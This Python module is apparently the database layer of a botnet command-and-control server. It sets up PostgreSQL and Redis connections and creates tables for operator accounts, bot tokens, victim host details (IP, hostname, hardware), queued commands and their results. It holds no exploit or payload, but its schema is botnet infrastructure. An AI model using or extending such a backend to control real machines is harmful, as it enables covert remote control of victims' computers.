# import the library to run Postgres instance
import asyncpg
from config import DB_NAME, DB_USER, DB_PASSWD, DB_HOST, DB_PORT, REDIS_HOST, REDIS_PORT
import redis.asyncio as redis

redis_client = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=0)
connection_pool = None

# establish a new connection
async def create_db_pool():
    global connection_pool
    print("Creating DB pool...")
    connection_pool =  await asyncpg.create_pool(
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASSWD,
        host=DB_HOST,
        port=DB_PORT,
        min_size=1,
        max_size=100
    )
    print("DB pool created.")

# close connection pool
async def close_db_pool():
    global connection_pool
    if connection_pool:
        await connection_pool.close()
        print("DB pool closed.")
    else:
        print("DB pool was not initialized.")

# get connection pool (for other modules)
async def get_connection_pool():
    if connection_pool is None:
        await create_db_pool()  # Nếu pool chưa được tạo, khởi tạo nó
    return connection_pool

async def init_db():
    if not connection_pool:
        raise Exception("DB connection pool is not initialized.")
    async with connection_pool.acquire() as conn:
        try: 
            await conn.execute("""
            ALTER TABLE commands
            DROP CONSTRAINT fk_commands_bot_id;
            """)

            await conn.execute("""
            ALTER TABLE logs
            DROP CONSTRAINT fk_logs_bot_id;
            """)

            await conn.execute("""
            ALTER TABLE logs
            DROP CONSTRAINT fk_logs_command_id;
            """)

            await conn.execute("""
            ALTER TABLE bot_info
            DROP CONSTRAINT fk_bot_info_bots_id;
            """)
            await conn.execute("DROP TABLE IF EXISTS c2_users;")
            await conn.execute("DROP TABLE IF EXISTS bots;")
            await conn.execute("DROP TABLE IF EXISTS bot_info;")
            await conn.execute("DROP TABLE IF EXISTS commands;")
            await conn.execute("DROP TABLE IF EXISTS logs;")

            await conn.execute("""
            CREATE TABLE IF NOT EXISTS c2_users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE NOT NULL,
                hashed_passwd VARCHAR(255) NOT NULL
            )
            """)

            await conn.execute("""
            CREATE TABLE IF NOT EXISTS bots (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE,
                status VARCHAR(10) NOT NULL DEFAULT 'offline'
            )
            """)

            # ip???
            await conn.execute("""
            CREATE TABLE IF NOT EXISTS bot_info(
                id SERIAL PRIMARY KEY,
                bot_id INTEGER NOT NULL,
                username VARCHAR(256),
                hostname VARCHAR(256),
                ip VARCHAR(50),
                os VARCHAR(256),
                cpu VARCHAR(256),
                gpu VARCHAR(256),
                ram VARCHAR(256),
                disk VARCHAR(256),
                current_directory TEXT 
            )    
            """)

            await conn.execute("""
            CREATE TABLE IF NOT EXISTS commands(
                id SERIAL PRIMARY KEY,
                bot_id INTEGER NOT NULL,
                command TEXT NOT NULL,
                directory TEXT NOT NULL,
                status VARCHAR(50) NOT NULL DEFAULT 'pending',
                issued_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """)

            await conn.execute("""
            CREATE TABLE IF NOT EXISTS logs(
                id SERIAL PRIMARY KEY,
                bot_id INTEGER NOT NULL,
                command_id INTEGER NOT NULL,
                result TEXT,
                timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """)

            await conn.execute("""
            ALTER TABLE commands
            ADD CONSTRAINT fk_commands_bot_id
            FOREIGN KEY (bot_id) REFERENCES bots(id);
            """)

            await conn.execute("""
            ALTER TABLE logs
            ADD CONSTRAINT fk_logs_bot_id
            FOREIGN KEY (bot_id) REFERENCES bots(id);
            """)

            await conn.execute("""
            ALTER TABLE logs
            ADD CONSTRAINT fk_logs_command_id
            FOREIGN KEY (command_id) REFERENCES commands(id);
            """)

            await conn.execute("""
            ALTER TABLE bot_info
            ADD CONSTRAINT fk_bot_info_bots_id
            FOREIGN KEY (bot_id) REFERENCES bots(id);
            """)
        except Exception as e:
            raise Exception(f"error initializing database: {str(e)}")
    